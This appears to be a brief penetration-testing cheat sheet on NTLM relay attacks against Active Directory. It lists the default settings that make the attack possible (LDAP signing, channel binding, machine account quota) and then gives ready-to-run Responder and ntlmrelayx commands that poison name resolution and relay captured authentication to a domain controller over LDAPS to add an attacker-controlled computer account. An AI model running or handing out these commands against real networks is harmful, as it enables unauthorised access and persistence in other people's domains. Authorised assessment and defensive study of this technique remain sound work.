# NTLM Relaying attacks

## LDAP signing not required and LDAP channel binding disabled

### During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed:

#### 1) LDAP signing not required (by default set to Not required )

#### 2) LDAP channel binding is disabled. (by default disabled)

#### 3) ms-DS-MachineAccountQuota needs to be at least at 1 for the account relayed (10 by default)

### Then we can use a tool to poison LLMNR , MDNS and NETBIOS requests on the network such as Responder and use ntlmrelayx to add our computer.

#### 1) Responder on 1 terminal

 - sudo ./Responder.py -I eth0 -wfrd -P -v

#### 2) Ntlmrelayx on 2 terminal

 - sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer

## It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.

